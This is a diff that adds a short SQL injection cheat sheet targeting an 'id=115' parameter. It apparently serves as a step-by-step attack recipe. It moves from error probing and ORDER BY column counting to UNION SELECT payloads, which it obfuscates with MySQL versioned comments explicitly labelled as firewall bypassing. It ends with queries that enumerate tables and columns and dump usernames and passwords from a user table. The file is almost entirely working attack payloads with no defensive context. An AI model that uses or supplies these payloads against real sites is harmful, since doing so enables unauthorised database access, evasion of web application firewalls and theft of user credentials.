@@ -1,0 +1,26 @@
+id=115'
+
+id=115'-- -
+
+check error using: order by (number)-- -
+id=115' order by 7-- -
+
+id=115'UNION SELECT 1,2,3,4,5,6-- -
+
+firewall bypassing: find v column
+id=115'/*!12345UNION*/ SELECT 1,2,3,4,5,6-- -
+
+id=115'/*!12345UNION*/ SELECT 1,2,version(),4,5,6-- -
+id=115'/*!12345UNION*/ SELECT 1,2,database(),4,5,6-- -
+id=115'/*!12345UNION*/ SELECT 1,2,user(),4,5,6-- -
+
+id=115'/*!12345UNION*/ SELECT 1,2,table_name,4,5,6 /*!12345from*/ /*!12345information_schema.tables*/ where table_schema=database()-- -
+
+id=115'/*!12345UNION*/ SELECT 1,2,group_concat(table_name),4,5,6 /*!12345from*/ /*!12345information_schema.tables*/ where table_schema=database()-- -
+
+id=115'/*!12345UNION*/ SELECT 1,2,group_concat(column_name),4,5,6 /*!12345from*/ /*!12345information_schema.columns*/ where table_name='usertable'-- -
+
+id=115'/*!12345UNION*/ SELECT 1,2,group_concat(username, '<br>',password),4,5,6 /*!12345from*/ usertable-- -
+
+
+
